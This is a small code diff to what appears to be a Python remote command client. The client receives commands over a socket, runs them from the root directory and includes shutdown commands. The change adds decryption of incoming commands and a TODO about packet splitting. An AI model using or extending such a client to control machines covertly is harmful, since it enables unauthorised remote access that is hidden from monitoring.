@@ -17,6 +17,7 @@ power_commands = {"shutdown": {"Windows": "shutdown /s /t 000",
 
 
 def send_response(client_socket, msg_type, msg):
+    # TODO: split long commands to many packets
     path = os.getcwd()
 
     if msg_type == "filepart":
@@ -99,7 +100,8 @@ def main():
     os.chdir("/")
     command = ""
     while command != "exit 0":
-        command = client_socket.recv(1024).decode()
+        enc_command = client_socket.recv(1024)
+        command = encryption.decrypt(enc_command)
         if len(command.split()) >= 2:
             cmd_type, cmd = handle_server_response(command, client_socket)
         else:
